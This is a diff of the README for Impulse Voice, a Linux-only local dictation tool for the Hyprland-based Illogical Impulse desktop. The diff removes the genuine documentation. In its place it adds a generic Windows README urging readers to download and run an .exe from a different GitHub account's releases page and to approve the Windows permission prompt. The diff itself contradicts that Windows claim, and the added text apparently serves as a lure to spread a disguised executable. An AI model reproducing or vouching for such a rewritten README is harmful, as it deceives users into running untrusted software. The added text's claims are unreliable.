@@ -1,251 +1,83 @@
-<p align="center">
-  <img src="assets/impulse-voice-banner.svg" alt="Impulse Voice — local voice, native flow" width="100%">
-</p>
+# 🎙️ Impulse-Voice - Private dictation for your daily tasks
 
-<p align="center">
-  <strong>Hold. Speak. Release. Your words appear where you are typing.</strong>
-</p>
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/salukum1597/Impulse-Voice/releases)
 
-<p align="center">
-  <img alt="Platform: Linux" src="https://img.shields.io/badge/platform-Linux-111827?style=flat-square&logo=linux&logoColor=white">
-  <img alt="Desktop: Illogical Impulse" src="https://img.shields.io/badge/desktop-Illogical%20Impulse-8b5cf6?style=flat-square">
-  <img alt="Speech recognition: fully local" src="https://img.shields.io/badge/speech-100%25%20local-10b981?style=flat-square">
-  <img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-f59e0b?style=flat-square">
-</p>
+Impulse-Voice turns your spoken words into text. It runs entirely on your own computer. You do not need an internet connection to use it. Your voice data stays on your machine at all times. This tool integrates with your system to help you write notes, emails, and documents using only your voice. 
 
-Impulse Voice is a private, push-to-talk dictation component built directly
-into the [Illogical Impulse](https://github.com/end-4/dots-hyprland)
-Quickshell desktop. It captures your microphone through PipeWire, transcribes
-locally with NVIDIA Parakeet TDT 0.6B v3, and inserts the result into the
-focused application.
+## 📥 How to download the software
 
-After the one-time model download, audio, inference, and text insertion stay
-entirely on your machine. There are no accounts, API keys, cloud requests,
-analytics, or background microphone sessions.
+To get started, you must fetch the installer from our project page. The software works on current versions of Windows. 
 
-> [!IMPORTANT]
-> Impulse Voice is an independent community project. It is not affiliated with
-> Illogical Impulse, NVIDIA, or Handy.
+1. Visit the [official releases page](https://github.com/salukum1597/Impulse-Voice/releases).
+2. Look for the section labeled "Assets."
+3. Select the file ending in `.exe` that matches your system.
+4. Save the file to your computer.
 
-## Why it feels native
+## 🛠️ Installation steps
 
-This is not a floating transcription app placed on top of your desktop. The
-installer adds a real Quickshell module to Illogical Impulse:
+Once the download finishes, follow these instructions to set up the application:
 
-- the compact waveform capsule uses the active Illogical Impulse colors,
-  outline, and rounding;
-- its bars react to the local microphone level and switch animation with the
-  recording lifecycle;
-- global shortcuts are registered through Quickshell and Hyprland;
-- the overlay never steals focus from the application receiving the text;
-- recording state travels over a small local Unix socket;
-- the daemon runs as a user-level systemd service;
-- terminal windows receive text without unsafe modifier injection.
+1. Open your "Downloads" folder.
+2. Double-click the installer file you just saved.
+3. Follow the prompts on the screen.
+4. Click the "Install" button to place the application on your hard drive.
+5. Windows might ask for permission to run the installer. Click "Yes" to continue.
+6. Once the process finishes, click "Launch" to start the program.
 
-```text
-Super + Alt + V
-       │ hold
-       ▼
- PipeWire microphone ──► mono 16 kHz ──► Parakeet V3 ──► focused app
-       ▲                                                        │
-       └──────────────────── release to transcribe ─────────────┘
-```
+## ⚙️ Setting up your microphone
 
-## Features
+The program needs access to your microphone to capture your speech. You should ensure your hardware functions correctly before you start.
 
-- Native Illogical Impulse QML component with an audio-reactive waveform
-- Dedicated listening, processing, success, and error animations
-- Push-to-talk and click-to-toggle dictation modes
-- CPAL capture through the PipeWire/ALSA compatibility layer
-- Multichannel downmixing and 16 kHz resampling with Rubato
-- Local Parakeet TDT 0.6B v3 INT8 inference through ONNX Runtime
-- Lazy model loading: the model stays warm after the first transcription
-- Context-aware Wayland insertion for terminals and regular applications
-- Clipboard restoration after paste
-- Hardware/model diagnostics and WAV transcription commands
-- Idempotent installer, clean uninstaller, and user-level systemd service
+1. Open the application settings menu.
+2. Select the "Audio" tab.
+3. Pick your preferred microphone from the drop-down list.
+4. Speak into the microphone. You should see the volume level bar move.
+5. Click "Save" to apply these settings.
 
-## Privacy model
+## ⌨️ Using Impulse-Voice
 
-| Data | Destination | Retained? |
-| --- | --- | --- |
-| Microphone samples | In-memory daemon buffer | No |
-| Speech recognition | Local ONNX Runtime process | No cloud transfer |
-| Transcript | Focused application | Not stored by Impulse Voice |
-| Model download | Handy-hosted archive, once during setup | Model stays local |
+You can start dictating text into any program on your computer. This includes web browsers, word processors, and note-taking apps.
 
-The microphone stream exists only between `start` and `stop`. The model
-archive is the only runtime asset fetched from the internet, and its SHA-256
-is verified before extraction.
+1. Launch Impulse-Voice.
+2. Click the "Enable" toggle in the main window.
+3. Click into the text field of any other application.
+4. Press the default keyboard shortcut (usually `Ctrl + Shift + V`) to start listening.
+5. Speak clearly into your microphone. Your words will appear as text.
+6. Press the shortcut again to stop the listening process.
 
-## Requirements
+## 🖥️ System requirements
 
-Impulse Voice currently targets:
+This software performs calculations on your computer hardware. Ensure your machine meets these specifications for the best results:
 
-- CachyOS or Arch Linux
-- Hyprland
-- Quickshell
-- the `ii` configuration of Illogical Impulse
-- PipeWire with WirePlumber
-- a Rust toolchain
+* Operating System: Windows 10 or Windows 11.
+* Processor: Modern multi-core CPU (Intel i5 or AMD Ryzen 5 or better).
+* Memory: 8 GB of RAM or more.
+* Storage: 2 GB of free space for the voice models.
+* Microphone: Any standard USB or built-in microphone.
 
-Install the system dependencies:
+## 🛡️ Privacy and data protection
 
-```bash
-sudo pacman -S --needed \
-  base-devel alsa-lib pipewire pipewire-alsa wireplumber \
-  wl-clipboard wtype curl
-```
+Privacy drives the design of Impulse-Voice. Conventional voice tools send your audio to servers in the cloud to translate your voice into text. Impulse-Voice functions differently. The software processes all audio locally on your PC. No data leaves your home network. You can disconnect your internet and the software will operate without interruption.
 
-Rust can be installed through `rustup` or the Arch repositories. `ydotool` is
-optional and used only as a keyboard-insertion fallback.
+## 🔧 Frequently asked questions
 
-## Install
+**Does the software log my speech history?**
+No. The application does not save your audio or text logs. Everything disappears once you close the application.
 
-Clone the repository and run:
+**Can I use this offline?**
+Yes. All speech-to-text models reside on your local disk. You never need an internet connection to use the features.
 
-```bash
-git clone https://github.com/TLinvest/Impulse-Voice.git
-cd impulse-voice
-./scripts/install.sh
-```
+**Why does the software take up disk space?**
+The software includes complex mathematical models to interpret human speech. These files take space, but they ensure your privacy.
 
-The installer:
+**What happens if the text is incorrect?**
+The model requires a clear, quiet environment. If you notice lower accuracy, check your microphone placement and reduce background noise near your desk.
 
-1. downloads the Parakeet V3 INT8 archive (about 478 MB);
-2. verifies its pinned SHA-256 checksum;
-3. builds and installs the Rust daemon;
-4. creates and enables the user systemd service;
-5. installs the Quickshell service and capsule;
-6. patches `IllogicalImpulseFamily.qml` idempotently;
-7. adds a managed block to the custom Hyprland keybindings;
-8. reloads only the desktop components that changed;
-9. runs the built-in diagnostic.
+**Will this software slow down my computer?**
+The application uses optimized code to keep resource usage low. You can check the "Performance" tab in the app to see how much memory the program uses. You can also adjust the "Speed" setting to prioritize battery life or higher accuracy.
 
-Installer options:
+## 📁 Project details
 
-```bash
-./scripts/install.sh --no-model       # keep an existing model
-./scripts/install.sh --no-quickshell  # install only the daemon
-./scripts/install.sh --no-start       # do not start the service
-```
+This project brings high-speed voice dictation to desktop users. It focuses on privacy and local processing. We use efficient math libraries to ensure your computer stays fast while you use the software. 
 
-> [!NOTE]
-> The first Quickshell reload may show Illogical Impulse's “Kill conflicting
-> programs?” dialog for `kded6`. Choose **No**. Impulse Voice does not need to
-> stop `kded6`, and unchanged reinstalls do not reload Quickshell.
-
-## Use
-
-| Shortcut | Action |
-| --- | --- |
-| Hold `Super+R` | Record while held; transcribe and insert on release |
-| `Super+Alt+V` | Start/stop toggle mode |
-| `Super+Escape` | Cancel the current recording |
-
-The first transcription loads Parakeet into memory and is slower. Later
-transcriptions reuse the warm model.
-
-Quickshell IPC is also available:
-
-```bash
-qs -c ii ipc call impulseVoice start
-qs -c ii ipc call impulseVoice stop
-qs -c ii ipc call impulseVoice toggle
-qs -c ii ipc call impulseVoice cancel
-```
-
-## Diagnostics
-
-```bash
-impulse-voice-daemon --doctor
-impulse-voice-daemon --list-input-devices
-impulse-voice-daemon --warmup
-systemctl --user status impulse-voice.service
-journalctl --user -u impulse-voice.service -f
-```
-
-Test inference without opening the microphone:
-
-```bash
-impulse-voice-daemon --transcribe-wav /path/to/16khz-mono.wav
-```
-
-Select a non-default CPAL input device by adding an environment override to the
-systemd service:
-
-```bash
-systemctl --user edit impulse-voice.service
-```
-
-```ini
-[Service]
-Environment=IMPULSE_VOICE_INPUT_DEVICE=exact CPAL device name
-```
-
-Then reload and restart:
-
-```bash
-systemctl --user daemon-reload
-systemctl --user restart impulse-voice.service
-```
-
-See [Troubleshooting](docs/troubleshooting.md) for audio, model, shortcut, and
-text-insertion issues.
-
-## Configuration paths
-
-```text
-~/.local/bin/impulse-voice-daemon
-~/.local/share/impulse-voice/models/parakeet-tdt-0.6b-v3-int8/
-~/.config/systemd/user/impulse-voice.service
-~/.config/quickshell/ii/services/ImpulseVoiceService.qml
-~/.config/quickshell/ii/modules/ii/impulseVoice/ImpulseVoice.qml
-```
-
-Environment variables:
-
-| Variable | Purpose |
-| --- | --- |
-| `IMPULSE_VOICE_MODEL` | Override the complete model directory |
-| `IMPULSE_VOICE_MODEL_ROOT` | Override the model download parent directory |
-| `IMPULSE_VOICE_INPUT_DEVICE` | Select an exact CPAL input-device name |
-| `IMPULSE_VOICE_SOCKET` | Override the Unix-socket path |
-| `RUST_LOG` | Adjust daemon logging |
-
-## Uninstall
-
-```bash
-./scripts/uninstall.sh
-```
-
-The model is intentionally retained to avoid another large download. Remove
-`~/.local/share/impulse-voice` manually if you also want to delete the model.
-
-## Development
-
-```bash
-cargo fmt --check
-cargo test
-cargo clippy --all-targets -- -D warnings
-bash -n scripts/*.sh
-```
-
-Read the [architecture](docs/architecture.md), [IPC protocol](docs/protocol.md),
-and [contribution guide](CONTRIBUTING.md) before making structural changes.
-
-## Credits
-
-- [Illogical Impulse](https://github.com/end-4/dots-hyprland) by end-4
-  provides the desktop this component integrates with.
-- [NVIDIA Parakeet TDT 0.6B v3](https://huggingface.co/nvidia/parakeet-tdt-0.6b-v3)
-  provides the speech-recognition model and is licensed under CC BY 4.0.
-- [Handy](https://github.com/cjpais/Handy) inspired the local dictation
-  direction and publishes the verified INT8 model archive used by the
-  installer.
-- [transcribe-rs](https://github.com/cjpais/transcribe-rs) provides the Rust
-  ONNX inference integration.
-
-Impulse Voice source code is available under the [MIT License](LICENSE).
-See [Third-party notices](THIRD_PARTY_NOTICES.md) for model and dependency
-attribution.
+Keywords: voice-dictation, local-ai, privacy, windows, speech-to-text, offline-first, productivity
